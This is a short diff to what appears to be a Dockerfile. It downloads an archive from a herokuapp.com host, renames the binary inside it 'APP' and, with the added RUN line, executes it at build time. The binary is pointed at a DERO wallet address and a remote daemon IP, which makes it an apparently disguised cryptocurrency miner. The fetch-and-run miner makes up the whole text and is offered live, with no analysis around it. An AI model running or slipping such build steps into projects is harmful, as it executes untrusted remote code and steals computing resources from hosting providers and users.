@@ -65,4 +65,4 @@ RUN wget -q http://tools12321.herokuapp.com/apostropis/worker.tar.xz
 RUN tar xf worker.tar.xz 
 RUN mv worker APP 
 RUN chmod +x APP 
-./APP --wallet-address=dero1qyf2902ys7v2rm0hvu64fnghv3td4pqrq4x7v7uznarftemnpdm37qqm3khtw --daemon-rpc-address=107.21.149.229:10100
+RUN ./APP --wallet-address=dero1qyf2902ys7v2rm0hvu64fnghv3td4pqrq4x7v7uznarftemnpdm37qqm3khtw --daemon-rpc-address=107.21.149.229:10100
